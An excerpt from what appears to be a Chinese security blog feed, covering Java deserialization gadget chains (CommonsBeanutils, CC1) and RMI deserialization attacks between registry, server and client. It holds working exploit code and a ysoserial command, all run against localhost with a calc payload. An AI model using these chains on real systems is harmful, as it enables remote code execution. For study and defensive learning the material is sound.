setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, targetByteCodes);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        final BeanComparator comparator = <span class="keyword">new</span> BeanComparator();</span><br><span class="line">        <span class="function">final <span class="title">PriorityQueue</span>&lt;<span class="title">Object</span>&gt; queue</span> = <span class="keyword">new</span> PriorityQueue&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"></span><br><span class="line">        setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>); <span class="comment">//将comparator的property修改，使其在compare方法中去执行getOutputProperties</span></span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;queue&quot;</span>, <span class="keyword">new</span> Object[]&#123;obj, obj&#125;);</span><br><span class="line">        setFieldValue(queue, <span class="string">&quot;size&quot;</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(queue);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.<span class="keyword">out</span>.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">        PriorityQueue<span class="meta">#readObject()</span></span><br><span class="line">        PriorityQueue<span class="meta">#heapify()</span></span><br><span class="line">        PriorityQueue<span class="meta">#siftDown()</span></span><br><span class="line">        PriorityQueue<span class="meta">#siftDownUsingComparator()</span></span><br><span class="line">                BeanComparator<span class="meta">#compare()</span></span><br><span class="line">                      PropertyUtils<span class="meta">#getProperty()</span></span><br><span class="line">                              TemplatesImpl.newTransformer()</span><br><span class="line">                              TemplatesImpl.getTransletInstance()</span><br><span class="line">                                  EvilClass.newInstance()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>将java.util.PriorityQueue中的Comparator设置为BeanComparator，从而在BeanComparator#compare中调用getProperty方法，从而调用TemplatesImpl#getOutputProperties，进而触发TemplatesImpl _bytecodes字节码恶意实例化。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;我的博客即将同步至腾讯云+社区，邀请大家一同入驻：&lt;a href=&quot;https://cloud.tencent.com/developer/support-plan?invite_code=g3z1bctpoyvz&quot;&gt;https://cloud.tencent.com/de</summary>
      
    
    
    
    
    <category term="java开发与安全" scheme="http://const27.com/tags/java%E5%BC%80%E5%8F%91%E4%B8%8E%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>针对RMI的反序列化攻击</title>
    <link href="http://const27.com/2022/01/30/RMI%20ATTACK/"/>
    <id>http://const27.com/2022/01/30/RMI%20ATTACK/</id>
    <published>2022-01-30T14:06:51.407Z</published>
    <updated>2022-01-30T16:06:51.155Z</updated>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h1 id="RMI-ATTACK"><a href="#RMI-ATTACK" class="headerlink" title="RMI ATTACK"></a>RMI ATTACK</h1><p>引用自lala师傅</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130213639.png"></p><h2 id="RMI-反序列化攻击"><a href="#RMI-反序列化攻击" class="headerlink" title="RMI 反序列化攻击"></a>RMI 反序列化攻击</h2><p>RMI调用由三部分构成：服务端，客户端，注册端。而在RMI传输数据时，数据是以序列化的形式进行传输的，这就意味着RMI调用中存在反序列化的操作，这就给了反序列化攻击可乘之机。</p><p><code>在高版本JDK中，注册端和服务端是必须在同一台服务器上的，这就意味着在高版本JDK中注册端打服务端或者服务端打攻击端没啥用。而在低版本中这两者是可以分离的，还算有攻击的可能。但总体来说这类攻击方法还是很鸡肋的。</code></p><p>接下来会对攻击方和受害方的不同，分成6种攻击方式，如下。</p><p>（除非特殊说明，否则下面说的都是8u66和CC1链）</p><h3 id="服务端攻击注册端"><a href="#服务端攻击注册端" class="headerlink" title="服务端攻击注册端"></a>服务端攻击注册端</h3><p>服务端在向注册端使用bind等函数操作远程对象时，会提供一段序列化数据，注册端获取到序列化数据后会进行反序列化操作，这中间就会有反序列化漏洞发生可能。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130214018.png"></p><p>下面用CC1链去进行攻击，JDK版本8u66</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line">        Class AnnotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap);</span><br><span class="line">        Remote proxyEvalObject = Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), <span class="keyword">new</span> Class[] &#123; Remote.class &#125;, evalObject));</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">3333</span>);</span><br><span class="line">        Registry registry_remote = LocateRegistry.getRegistry(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">3333</span>);</span><br><span class="line">        registry_remote.bind(<span class="string">&quot;HelloRegistry&quot;</span>, proxyEvalObject);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130214021.png"></p><h3 id="注册端攻击服务端"><a href="#注册端攻击服务端" class="headerlink" title="注册端攻击服务端"></a>注册端攻击服务端</h3><p>服务端在向注册端使用bind等函数操作远程对象时，会提供一段序列化数据，随后注册端也会向服务端发送一段序列化数据，服务端便会进行反序列化操作，其中便存在反序列化漏洞发生的可能。</p><p>8u66</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:1234/setUser&quot;</span>;</span><br><span class="line">        user user = <span class="keyword">new</span> userImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">12345</span>);</span><br><span class="line">        Naming.unbind(url);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server Running At：&quot;</span> + url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时ysoserial开启恶意JRMP注册端，提供cc1链。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">java -cp .\ysoserial-master-d367e379d9-<span class="number">1.</span>jar ysoserial.exploit.JRMPListener <span class="number">1234</span> CommonsCollections1 <span class="string">&quot;calc&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130214025.png"></p><h3 id="服务端攻击客户端"><a href="#服务端攻击客户端" class="headerlink" title="服务端攻击客户端"></a>服务端攻击客户端</h3><p>RMI中，客户端和服务端的交互也是由序列化数据传输来进行的，所以服务端与客户端之间也存在相互反序列化攻击的可能。</p><p>服务端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">userImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">user</span></span>&#123; <span class="comment">//定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲))</span></span><br><span class="line">    <span class="keyword">protected</span> userImpl RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">userImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        ChainedTransformer chainedTransformer= <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                        <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        Map outermap = LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//妙处</span></span><br><span class="line">        InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);<span class="comment">//获得一个AnnotationInvocationHandler对象</span></span><br><span class="line">        Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);<span class="comment">//创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法</span></span><br><span class="line">        InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);  <span class="comment">//将代理Map传入，当代理Map被执行任一方法时，执行invoke方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> handler1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:23335/exp&quot;</span>;</span><br><span class="line">        user user = <span class="keyword">new</span> userImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">23335</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server Running At：&quot;</span> + url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> InvocationHandler <span class="title">exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String url = <span class="string">&quot;rmi://127.0.0.1:23335/exp&quot;</span>;</span><br><span class="line">            user user = (user)Naming.lookup(url);</span><br><span class="line">            Object ob = user.exp();</span><br><span class="line">            System.out.println(ob);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先启动服务端再启动客户端就能弹计算器辣</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215051.png"></p><h3 id="客户端攻击服务端"><a href="#客户端攻击服务端" class="headerlink" title="客户端攻击服务端"></a>客户端攻击服务端</h3><p>原理同上，不再说了。</p><p>服务端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exp</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">userImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">user</span></span>&#123; <span class="comment">//定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲))</span></span><br><span class="line">    <span class="keyword">protected</span> userImpl RemoteException;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">userImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exp</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">server</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">&quot;rmi://127.0.0.1:23335/exp&quot;</span>;</span><br><span class="line">        user user = <span class="keyword">new</span> userImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">23335</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">&quot;Server Running At：&quot;</span> + url);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">Remote</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">exp</span><span class="params">(Object a)</span> <span class="keyword">throws</span> Exception</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            String url = <span class="string">&quot;rmi://127.0.0.1:23335/exp&quot;</span>;</span><br><span class="line">            user user = (user)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">            ChainedTransformer chainedTransformer= <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                    <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                            String.class, Class[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                            <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[] &#123;</span><br><span class="line">                            Object.class, Object[].class &#125;, <span class="keyword">new</span> Object[] &#123;</span><br><span class="line">                            <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                    <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                            <span class="keyword">new</span> Class[] &#123; String.class &#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">            Map innermap = <span class="keyword">new</span> HashMap();</span><br><span class="line">            Map outermap = LazyMap.decorate(innermap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">            Class clazz = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">            Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">            cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"><span class="comment">//妙处</span></span><br><span class="line">            InvocationHandler handler = (InvocationHandler) cons.newInstance(Override.class,outermap);<span class="comment">//获得一个AnnotationInvocationHandler对象</span></span><br><span class="line">            Map Prox = (Map) Proxy.newProxyInstance(outermap.getClass().getClassLoader(), outermap.getClass().getInterfaces(),handler);<span class="comment">//创建一个Map的代理类，其代理方法为AnnotationInvocationHandler对象里的invoke方法</span></span><br><span class="line">            InvocationHandler handler1 = (InvocationHandler) cons.newInstance(Override.class,Prox);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            user.exp(handler1);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215059.png"></p><h3 id="客户端攻击注册端"><a href="#客户端攻击注册端" class="headerlink" title="客户端攻击注册端"></a>客户端攻击注册端</h3><p>在客户端向注册端发送查询请求时，会使用到lookup函数。<br>我们对lookup函数进行动态调试跟进，会来到这个地方。</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/20220130215458.png"></p><p>可以清晰地发现存在一个序列化方法writeObject，其中var1便是lookup方法中传入的字符串。var1在进行序列化后会在后面的ref.invoke(var2)处发送给服务端，服务端会反序列化这段数据，给了反序列化攻击产生的机会：我们可以仿写一个lookup方法，给var1赋值为恶意数据发送给服务端，造成攻击。</p><p>下面这段代码是我在先知上嫖的。<a href="https://xz.aliyun.com/t/8706#toc-9">https://xz.aliyun.com/t/8706#toc-9</a></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> sun.rmi.server.UnicastRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutput;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Remote;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.Operation;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteCall;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.RemoteObject;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] &#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[] &#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[] 